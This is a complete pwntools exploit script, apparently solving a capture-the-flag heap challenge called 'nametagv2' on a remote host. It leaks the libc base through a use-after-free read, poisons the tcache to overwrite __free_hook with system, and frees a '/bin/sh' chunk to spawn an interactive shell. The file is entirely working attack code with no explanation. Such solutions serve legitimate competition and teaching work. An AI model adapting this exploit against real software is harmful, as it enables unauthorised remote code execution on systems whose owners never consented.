from pwn import *

exe = ELF("./nametagv2_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "tcp.flagyard.com"
PORT = 24857

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
# args.DEBUG = True

def add_name(r, idx, size):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b":" , str(size).encode())

def edit_name(r, idx, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", name)

def delete_name(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())

def show_name(r, idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", str(idx).encode())

    r.recvuntil(b"Name: ")
    return r.recvline()

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_libc(r):
    add_name(r, 0, 0x410)
    add_name(r, 1, 0x20)

    delete_name(r, 0)
    delete_name(r, 1)
    
    libc.address = int.from_bytes(show_name(r, 0)[:6], "little") - 0x3ebca0
    log.success(f"LEAKED LIBC BASE: {hex(libc.address)}")
    
def tcache_poison(r):
    edit_name(r, 1, pack(libc.symbols.__free_hook))

    add_name(r, 2, 0x20)
    add_name(r, 3, 0x20)

    edit_name(r, 3, pack(libc.symbols.system))

    add_name(r, 4, 0x20)
    edit_name(r, 4, b"/bin/sh\x00")

    delete_name(r, 4)
    
def main():
    r = conn()

    leak_libc(r)
    tcache_poison(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
